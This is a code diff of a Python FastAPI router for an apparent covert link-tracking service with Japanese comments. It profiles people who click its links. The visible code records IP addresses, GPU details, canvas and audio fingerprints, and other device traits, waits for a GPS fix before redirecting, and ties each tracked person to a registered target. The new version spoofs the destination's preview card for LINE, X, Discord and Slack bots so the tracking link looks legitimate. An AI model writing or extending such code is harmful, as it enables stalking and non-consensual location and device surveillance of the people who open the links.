@@ -1,21 +1,20 @@
 """追跡ルーター：リンク踏み（一瞬/ライブ/クイズ/識別/転送）・人物ごとの登録・追跡画面。
 
-v13:
+v14:
   ・転送を2モードに分割
-      redirect     … 即リダイレクト（位置情報を要求しない。許可ダイアログを出さない）
-      redirect_gps … 即リダイレクト（位置情報を要求し、取得できるまで待ってから移動）
+      redirect     … 即リダイレクト（位置情報を要求しない）
+      redirect_gps … 即リダイレクト（位置情報を取得してから移動）
+  ・転送スプラッシュに飛び先のOGPを埋める（LINE/X/Discord/Slack のカード表示用）
+  ・main._create_link を実行時に自動パッチ（redirect_gps を main.py 無改造で通す）
   ・GPSありの転送は beacon 送信＋上限待ち。許可済みなら短く、未許可なら長く待つ
   ・hold=0 は完全即302（GPSも取らない）
-  ・クイズは質問0件でもクイズ画面を返す（監視室へ落ちない）
-  ・全モードで collect.js を必ず走らせ、取得物を全部保存
-  ・逆探知（/link/{code}/reverse）への導線
-  ・_quiz_rows を旧DBの列不足に耐えるよう安全アクセス化
 """
 from __future__ import annotations
 
-import os, re, json, random, string, datetime as dt
-from urllib.parse import quote
+import os, re, json, random, string, time, html as _html, datetime as dt
+from urllib.parse import quote, urljoin, urlsplit
 
+import requests
 from fastapi import APIRouter, Request, Depends, Form, HTTPException
 from fastapi.responses import HTMLResponse, RedirectResponse, PlainTextResponse
 
@@ -74,7 +73,6 @@ UI_LABEL = {
 VALID_MODES = ("page", "geo", "snap", "live", "quiz", "identify",
                "redirect", "redirect_gps")
 
-# 転送系（無表示で収集して即移動）
 REDIRECT_MODES = ("redirect", "redirect_gps")
 
 MODE_LABEL = {
@@ -84,6 +82,95 @@ MODE_LABEL = {
     "redirect": "即リダイレクト（位置情報なし）",
     "redirect_gps": "即リダイレクト（位置情報あり）",
 }
+
+# ---------- OGP（飛び先のカード表示） ----------
+OG_UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
+         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Line/13.6.0")
+UNFURL_KW = ("line/", "linespider", "twitterbot", "facebookexternalhit", "facebot",
+             "slackbot", "discordbot", "telegrambot", "whatsapp", "linkedinbot",
+             "embedly", "pinterest", "kakaotalk-scrap", "plurkbot", "skypeuripreview",
+             "bot")
+_OG_CACHE = {}
+_OG_TS = {}
+OG_TTL = 3600
+
+
+def _meta(html_text, *names):
+    for n in names:
+        for pat in (
+            r'<meta[^>]+(?:property|name)\s*=\s*["\']' + re.escape(n) +
+            r'["\'][^>]*content\s*=\s*["\']([^"\']*)["\']',
+            r'<meta[^>]+content\s*=\s*["\']([^"\']*)["\'][^>]*(?:property|name)\s*=\s*["\']' +
+            re.escape(n) + r'["\']',
+        ):
+            m = re.search(pat, html_text, re.I | re.S)
+            if m and m.group(1).strip():
+                return _html.unescape(m.group(1).strip())
+    return ""
+
+
+def _title(html_text):
+    m = re.search(r"<title[^>]*>(.*?)</title>", html_text, re.I | re.S)
+    return _html.unescape(re.sub(r"\s+", " ", m.group(1))).strip()[:200] if m else ""
+
+
+def og_preview(dest, fetch=False):
+    """飛び先のOGPを返す。fetch=False ならキャッシュのみ（人間の体感を落とさない）。"""
+    dest = (dest or "").strip()
+    host = urlsplit(dest).netloc if dest else ""
+    base = {"title": host or "リンク", "desc": "", "image": "", "site": host,
+            "w": "", "h": ""}
+    if not dest:
+        return base
+    now = time.time()
+    hit = _OG_CACHE.get(dest)
+    if hit is not None and now - _OG_TS.get(dest, 0) < OG_TTL:
+        return hit or base
+    if not fetch and hit is not None:
+        return hit or base
+    if not fetch:
+        return base
+
+    info = {}
+    try:
+        r = requests.get(dest, timeout=4.0, allow_redirects=True, headers={
+            "User-Agent": OG_UA,
+            "Accept": "text/html,application/xhtml+xml",
+            "Accept-Language": "ja,en;q=0.8",
+        })
+        body = (r.text or "")[:400000]
+        final = r.url or dest
+        info["title"] = (_meta(body, "og:title", "twitter:title")
+                         or _title(body))[:200]
+        info["desc"] = (_meta(body, "og:description", "twitter:description",
+                              "description"))[:300]
+        img = _meta(body, "og:image:secure_url", "og:image", "twitter:image",
+                    "twitter:image:src", "image")
+        if not img:
+            img = _meta(body, "msapplication-tileimage")
+        if not img:
+            m = re.search(r'<link[^>]+rel=["\'](?:apple-touch-icon|icon)["\'][^>]*href\s*=\s*["\']([^"\']+)', body, re.I)
+            img = m.group(1) if m else ""
+        if img:
+            info["image"] = urljoin(final, img)
+        info["w"] = _meta(body, "og:image:width")[:8]
+        info["h"] = _meta(body, "og:image:height")[:8]
+        site = _meta(body, "og:site_name")
+        info["site"] = (site or urlsplit(final).netloc)[:80]
+        if not info.get("title"):
+            info["title"] = (urlsplit(final).netloc or host)[:120]
+    except Exception:
+        info = {}
+
+    _OG_CACHE[dest] = info
+    _OG_TS[dest] = now
+    if len(_OG_CACHE) > 500:
+        for k in list(_OG_CACHE)[:200]:
+            _OG_CACHE.pop(k, None)
+            _OG_TS.pop(k, None)
+    out = dict(base)
+    out.update({k: v for k, v in info.items() if v})
+    return out
 
 
 def _coerce(key, v):
@@ -124,8 +211,33 @@ def live_cfg():
     return out
 
 
+def _install_patch(main):
+    """main._create_link に redirect_gps を通す薄いラッパを被せる（冪等）。"""
+    f = getattr(main, "_create_link", None)
+    if not f or getattr(f, "_igt_patched", False):
+        return
+    orig = f
+
+    def _create_link(name, dest, note, mode, u):
+        if mode == "redirect_gps":
+            code = main._new_code()
+            users.register_link(code, u)
+            db.add_link(code, name or code, (dest or "").strip(),
+                        (note or "").strip()[:200], "redirect_gps")
+            try:
+                persist.push_user(u, force=True)
+            except Exception:
+                pass
+            return code, "redirect_gps"
+        return orig(name, dest, note, mode, u)
+
+    _create_link._igt_patched = True
+    main._create_link = _create_link
+
+
 def _m():
     from . import main
+    _install_patch(main)
     return main
 
 
@@ -372,13 +484,16 @@ def link_hit(code: str, request: Request):
 
     # 転送：無表示のまま収集だけ済ませて即移動
     #   redirect      … 位置情報は要求しない（許可ダイアログを出さない）
-    #   redirect_gps  … 位置情報を要求し、取得できるまで待ってから移動
+    #   redirect_gps  … 位置情報を取得できるまで待ってから移動
     #   ?hold=0 / redirect_hold=false は完全即302（GPSも取らない）
     if mode in REDIRECT_MODES and link["dest"]:
         hold = request.query_params.get("hold")
         if hold == "0" or not L["redirect_hold"]:
             return RedirectResponse(link["dest"], 302)
         want_gps = (mode == "redirect_gps")
+        dest = _abs_dest(link["dest"])
+        ua = (request.headers.get("user-agent", "") or "").lower()
+        is_unfurl = any(k in ua for k in UNFURL_KW)
         geo_wait = 6000
         try:
             geo_wait = int(os.getenv("REDIRECT_GEO_WAIT_MS", "6000"))
@@ -386,7 +501,8 @@ def link_hit(code: str, request: Request):
             pass
         geo_wait = max(1500, min(geo_wait, 15000))
         return render("link_splash.html", request, code=code, hit_id=hid, link=link,
-                      dest=_abs_dest(link["dest"]), nonce=nonce, geo=want_gps,
+                      dest=dest, nonce=nonce, geo=want_gps,
+                      og=og_preview(dest, fetch=is_unfurl),
                       wait_ms=int(os.getenv("REDIRECT_WAIT_MS", "450")),
                       geo_wait_ms=geo_wait)
 
@@ -420,7 +536,7 @@ def link_hit(code: str, request: Request):
                   deny_redirect=L["deny_redirect"], dest_min=L["dest_min"])
 
 
-# 受け取る全フィールド（collect.js v17 と一致）
+# 受け取る全フィールド（collect.js v18 と一致）
 _HIT_STR = ("screen", "platform", "tz", "tz_client", "lang_list", "lan_ip", "pub_ip",
             "gpu", "webgl_hash", "canvas_fp", "audio_fp", "codecs", "media_devices",
             "storage", "net_type", "pointer", "orientation", "dnt", "permissions",
